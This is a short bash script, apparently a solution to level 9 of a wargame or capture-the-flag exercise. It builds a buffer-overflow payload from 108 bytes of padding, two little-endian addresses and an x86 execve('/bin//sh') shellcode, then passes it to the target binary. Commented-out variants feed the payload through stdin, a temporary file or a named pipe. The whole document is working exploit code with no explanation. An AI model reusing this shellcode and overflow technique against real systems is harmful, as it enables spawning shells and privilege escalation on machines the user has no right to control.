#!/bin/bash

##### FORGE PAYLOAD #####

elf="/home/user/level9/level9"

offset=$(printf "%108s" " " | tr ' ' 'A')

# Converting address from hexadecimal to little endian format
address='0804a07c'
address1=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})

# Converting address from hexadecimal to little endian format
address='0804a080'
address2=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})

sc=$(printf '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')

payload="${offset}${address1}${address2}${sc}"

##### SEND PAYLOAD #####

# Sending payload as argument
"$elf" "${payload}"

# Sending payload
#echo "${payload}" | "$elf"

# Sending payload and restoring our stdin
#echo "${payload}" > /tmp/payload; cat /tmp/payload - | "$elf"; rm /tmp/payload

# Sending payload and restoring our stdin with FIFOs
#mkfifo /tmp/exploitpipe
#"$elf" < /tmp/exploitpipe &
#pid=$!
#echo "${payload}" > /tmp/exploitpipe
#cat > /tmp/exploitpipe
#wait $pid
#rm /tmp/exploitpipe
